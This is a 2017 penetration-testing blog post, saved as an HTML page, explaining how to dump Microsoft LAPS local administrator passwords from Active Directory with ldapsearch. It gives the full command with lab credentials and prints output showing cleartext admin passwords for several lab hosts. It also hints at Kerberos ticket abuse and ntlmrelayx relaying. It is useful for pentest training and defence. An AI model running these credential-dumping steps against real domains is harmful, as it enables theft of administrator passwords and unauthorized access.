@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Dump LAPS passwords with ldapsearch - Malicious Link - Blog by mubix - Rob Fuller</title><meta name="Description" content="This is a cool blog"><meta property="og:title" content="Dump LAPS passwords with ldapsearch" />
+<meta property="og:description" content="If you&rsquo;ve ever been pentesting an organization that had LAPS, you know that it is the best solution for randomizing local administrator passwords on the planet. (You should just be leaving them disabled).
+LAPS stores it&rsquo;s information in Active Directory:
+The expiration time: ms-Mcs-AdmPwdExpirationTime: 131461867015760024
+And the actual password in clear text: ms-Mcs-AdmPwd: %v!e#7S#{s})&#43;y2yS#(
+When LAPS first came it, any user in Active Directory could read it. Microsoft fixed that, you now have to have the All extended rights permission to the object or Full Control of it." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://malicious.link/posts/2017/dump-laps-passwords-with-ldapsearch/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2017-07-24T07:35:28-05:00" />
+<meta property="article:modified_time" content="2017-07-24T07:35:28-05:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Dump LAPS passwords with ldapsearch"/>
+<meta name="twitter:description" content="If you&rsquo;ve ever been pentesting an organization that had LAPS, you know that it is the best solution for randomizing local administrator passwords on the planet. (You should just be leaving them disabled).
+LAPS stores it&rsquo;s information in Active Directory:
+The expiration time: ms-Mcs-AdmPwdExpirationTime: 131461867015760024
+And the actual password in clear text: ms-Mcs-AdmPwd: %v!e#7S#{s})&#43;y2yS#(
+When LAPS first came it, any user in Active Directory could read it. Microsoft fixed that, you now have to have the All extended rights permission to the object or Full Control of it."/>
+<meta name="application-name" content="malicious.link">
+<meta name="apple-mobile-web-app-title" content="malicious.link"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://malicious.link/posts/2017/dump-laps-passwords-with-ldapsearch/" /><link rel="prev" href="https://malicious.link/posts/2017/security-affairs-questions/" /><link rel="next" href="https://malicious.link/posts/2017/2017-derbycon-hiring-list/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Dump LAPS passwords with ldapsearch",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/malicious.link\/posts\/2017\/dump-laps-passwords-with-ldapsearch\/"
+        },"genre": "posts","keywords": "defcon, blackhat, ldapsearch, LAPS","wordcount":  519 ,
+        "url": "https:\/\/malicious.link\/posts\/2017\/dump-laps-passwords-with-ldapsearch\/","datePublished": "2017-07-24T07:35:28-05:00","dateModified": "2017-07-24T07:35:28-05:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Rob Fuller"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/brandon"> Brandon </a><a class="menu-item" href="/categories"> Categories </a><a class="menu-item" href="/posts"> Posts </a><a class="menu-item" href="/start"> Start </a><a class="menu-item" href="/tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/brandon" title="">Brandon</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/posts" title="">Posts</a><a class="menu-item" href="/start" title="">Start</a><a class="menu-item" href="/tags" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Dump LAPS passwords with ldapsearch</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/mubix" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Rob Fuller</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2017-07-24">2017-07-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;519 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/2017/ldapsearch_laps_rights.png"
+        data-srcset="/images/2017/ldapsearch_laps_rights.png, /images/2017/ldapsearch_laps_rights.png 1.5x, /images/2017/ldapsearch_laps_rights.png 2x"
+        data-sizes="auto"
+        alt="/images/2017/ldapsearch_laps_rights.png"
+        title="/images/2017/ldapsearch_laps_rights.png" /></p>
+<p>If you&rsquo;ve ever been pentesting an organization that had LAPS, you know that it is the best solution for randomizing local administrator passwords on the planet. (You should just be leaving them disabled).</p>
+<p>LAPS stores it&rsquo;s information in Active Directory:</p>
+<ul>
+<li>
+<p>The expiration time: <code>ms-Mcs-AdmPwdExpirationTime: 131461867015760024</code></p>
+</li>
+<li>
+<p>And the actual password in clear text: <code>ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#(</code></p>
+</li>
+</ul>
+<p>When LAPS first came it, any user in Active Directory could read it. Microsoft fixed that, you now have to have the <code>All extended rights</code> permission to the object or Full Control of it.</p>
+<p>In many organizations, there are pockets of <strong>OU</strong> admins, or even standard users that are in charge of a specific set of Users and (in particular) computers in which they have full control over.</p>
+<p>There is already a Metasploit module thanks to <a href="https://github.com/Meatballs1" target="_blank" rel="noopener noreffer ">Meatballs</a>:
+<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb" target="_blank" rel="noopener noreffer ">https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb</a>. But, unfortunately I don&rsquo;t always have access to a Meterpreter session to run the module.</p>
+<p>Using <code>ldapsearch</code> (which is included in the package <code>ldapscripts</code> on Debian/Ubuntu) can be used to make the same query that the module does. Here is an example run:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ldapsearch -x -h 192.168.80.10 -D \
+</span></span><span class="line"><span class="cl">&#34;helpdesk&#34; -w ASDqwe123 -b &#34;dc=sittingduck,dc=info&#34; \
+</span></span><span class="line"><span class="cl">&#34;(ms-MCS-AdmPwd=*)&#34; ms-MCS-AdmPwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Lets break this down:</p>
+<ul>
+<li><code>-x</code> - Use basic authentication</li>
+<li><code>-h 192.168.80.10</code> - Connect to the Domain Controller for ldap</li>
+<li><code>-D &quot;helpdesk&quot; -w ASDqwe123</code> - Login as the <code>helpdesk</code> user, with the password <code>ASDqwe123</code></li>
+<li><code>-b &quot;dc=sittingduck,dc=info&quot;</code> - This loads the base LDAP object of the entire domain.</li>
+<li><code>&quot;(ms-MCS-AdmPwd=*)&quot;</code> - Filter out any objects that I can&rsquo;t see a value for <code>ms-MCS-AdmPwd</code> for. (If you have rights as that user to see even one Administrator password, this will show it.)</li>
+<li><code>ms-MCS-AdmPwd</code> - Only show me the <code>ms-MCS-AdmPwd</code> object (which by default includes the object name and DN so you will still know what host it belongs to)</li>
+</ul>
+<p>What does that look like?</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ldapsearch -x -h 192.168.80.10 -D &#34;helpdesk&#34; -w ASDqwe123 -b &#34;dc=sittingduck,dc=info&#34; &#34;(ms-MCS-AdmPwd=*)&#34; ms-MCS-AdmPwd
+</span></span><span class="line"><span class="cl"># extended LDIF
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl"># LDAPv3
+</span></span><span class="line"><span class="cl"># base &lt;dc=sittingduck,dc=info&gt; with scope subtree
+</span></span><span class="line"><span class="cl"># filter: (ms-MCS-AdmPwd=*)
+</span></span><span class="line"><span class="cl"># requesting: ms-MCS-AdmPwd
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># DC1, Domain Controllers, sittingduck.info
+</span></span><span class="line"><span class="cl">dn: CN=DC1,OU=Domain Controllers,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">ms-Mcs-AdmPwd: 2F1i/++N0H+G]{Y&amp;,F
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># SDCLIENT_DAWIN7, LabComputers, Lab, sittingduck.info
+</span></span><span class="line"><span class="cl">dn: CN=SDCLIENT_DAWIN7,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">ms-Mcs-AdmPwd: 8CDR4,2UE8BA{zw2@RR
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># SD_WSUS_2012, LabComputers, Lab, sittingduck.info
+</span></span><span class="line"><span class="cl">dn: CN=SD_WSUS_2012,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">ms-Mcs-AdmPwd: +3!UY5@g9B.64RV2z/T
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># WIN-PM0ID6F0AHN, LabComputers, Lab, sittingduck.info
+</span></span><span class="line"><span class="cl">dn: CN=WIN-PM0ID6F0AHN,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#(
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># search reference
+</span></span><span class="line"><span class="cl">ref: ldap://research.sittingduck.info/DC=research,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># search reference
+</span></span><span class="line"><span class="cl">ref: ldap://ForestDnsZones.sittingduck.info/DC=ForestDnsZones,DC=sittingduck,D
+</span></span><span class="line"><span class="cl"> C=info
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># search reference
+</span></span><span class="line"><span class="cl">ref: ldap://DomainDnsZones.sittingduck.info/DC=DomainDnsZones,DC=sittingduck,D
+</span></span><span class="line"><span class="cl"> C=info
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># search reference
+</span></span><span class="line"><span class="cl">ref: ldap://sittingduck.info/CN=Configuration,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># search result
+</span></span><span class="line"><span class="cl">search: 2
+</span></span><span class="line"><span class="cl">result: 0 Success
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, just having the local admin password doesn&rsquo;t ensure that it&rsquo;s enabled, but there is a good bet that you are good to go now.</p>
+<p><strong>P.S.</strong> You can also authenticate using Kerberos (think Golden/Silver tickets)</p>
+<p><strong>P.P.S</strong> Because Windows doesn&rsquo;t (to the best of my knowledge) require signing on Domain Controllers for LDAP connections yet (probably does in 2016 or will soon), with a little bit of coding you can get <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py" target="_blank" rel="noopener noreffer ">ntlmrelayx</a> to dump LAPS passwords ;-)</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2017-07-24</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://malicious.link/posts/2017/dump-laps-passwords-with-ldapsearch/" data-title="Dump LAPS passwords with ldapsearch" data-via="mubix" data-hashtags="defcon,blackhat,ldapsearch,LAPS"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://malicious.link/posts/2017/dump-laps-passwords-with-ldapsearch/" data-hashtag="defcon"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://malicious.link/posts/2017/dump-laps-passwords-with-ldapsearch/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://malicious.link/posts/2017/dump-laps-passwords-with-ldapsearch/" data-title="Dump LAPS passwords with ldapsearch"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://malicious.link/posts/2017/dump-laps-passwords-with-ldapsearch/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://malicious.link/posts/2017/dump-laps-passwords-with-ldapsearch/" data-title="Dump LAPS passwords with ldapsearch"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://malicious.link/posts/2017/dump-laps-passwords-with-ldapsearch/" data-title="Dump LAPS passwords with ldapsearch"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://malicious.link/posts/2017/dump-laps-passwords-with-ldapsearch/" data-title="Dump LAPS passwords with ldapsearch"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/defcon/">defcon</a>,&nbsp;<a href="/tags/blackhat/">blackhat</a>,&nbsp;<a href="/tags/ldapsearch/">ldapsearch</a>,&nbsp;<a href="/tags/laps/">LAPS</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2017/security-affairs-questions/" class="prev" rel="prev" title="Security Affairs Questions"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Security Affairs Questions</a>
+            <a href="/posts/2017/2017-derbycon-hiring-list/" class="next" rel="next" title="2017 DerbyCon Hiring List">2017 DerbyCon Hiring List<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2005 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/mubix" target="_blank">Rob Fuller</a></span>&nbsp;|&nbsp;<span class="license">All Rights Reserved</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
